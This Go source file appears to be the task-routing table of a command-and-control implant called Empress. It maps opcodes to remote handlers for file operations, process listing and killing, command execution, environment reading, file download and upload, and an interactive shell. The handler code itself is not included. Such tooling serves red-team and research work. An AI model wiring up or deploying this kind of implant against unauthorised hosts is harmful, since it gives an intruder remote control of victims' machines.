package tasks

import (
	"github.com/pygrum/Empress/c2"
	"github.com/pygrum/Empress/tasks/core/fs"
	"github.com/pygrum/Empress/tasks/core/net"
	"github.com/pygrum/Empress/tasks/core/proc"
	"github.com/pygrum/Empress/tasks/core/system"
)

const (
	opCd = iota
	opLs
	opPwd
	opWhoami
	opCat
	opPs
	opKill
	opExec
	opRm
	opRmdir
	opEnv
	opDownload
	opUpload
	opCp
	opMv
	opChmod
	opMkdir
	opIfconfig
	opShell
)

func SetTasks(r *c2.Router) {
	r.HandleFunc(opCd, fs.CmdCD)
	r.HandleFunc(opLs, fs.CmdLS)
	r.HandleFunc(opPwd, fs.CmdPWD)
	r.HandleFunc(opWhoami, system.CmdWhoami)
	r.HandleFunc(opCat, fs.CmdCat)
	r.HandleFunc(opPs, proc.CmdPs)
	r.HandleFunc(opKill, proc.CmdKill)
	r.HandleFunc(opExec, proc.CmdExec)
	r.HandleFunc(opRm, fs.CmdRm)
	r.HandleFunc(opRmdir, fs.CmdRmdir)
	r.HandleFunc(opEnv, system.CmdEnv)
	r.HandleFunc(opDownload, net.CmdDownload)
	r.HandleFunc(opUpload, net.CmdUpload)
	r.HandleFunc(opCp, fs.CmdCP)
	r.HandleFunc(opMv, fs.CmdMV)
	r.HandleFunc(opChmod, fs.CmdChmod)
	r.HandleFunc(opMkdir, fs.CmdMkdir)
	r.HandleFunc(opIfconfig, net.CmdIfconfig)
	r.HandleFunc(opShell, system.CmdShell)
}
